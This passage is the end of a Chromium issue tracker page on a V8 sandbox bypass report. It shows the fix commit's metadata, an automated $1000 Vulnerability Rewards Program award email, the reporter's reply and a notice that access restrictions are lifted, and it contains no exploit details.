    Change-Id: I0d613c4fd8702a0d4805b0b9a0ada48f4f854da1 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6687412 
    Commit-Queue: Omer Katz <omerkatz@chromium.org> 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101138}

```

---

Files:

- M `src/heap/memory-allocator.cc`
- M `src/heap/memory-chunk.cc`
- M `src/heap/memory-chunk.h`
- M `src/heap/memory-pool.cc`

---

Hash: e9da968ce90548cc16706fb213b8211e001b8746  

Date:  Mon Jun 30 15:02:14 2025


---

### sp...@google.com (2025-07-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
report of a V8 sandbox bypass that did not fully demonstrate potentially exploitability in shipped, production versions of Chrome, but did result in a security beneficial change


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### da...@hirsch.cx (2025-07-29)

Thanks for the reward! :)

Just fyi, the fuzzer was also unable to find anything related in the meantime.

### ch...@google.com (2025-10-07)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/427662337)*
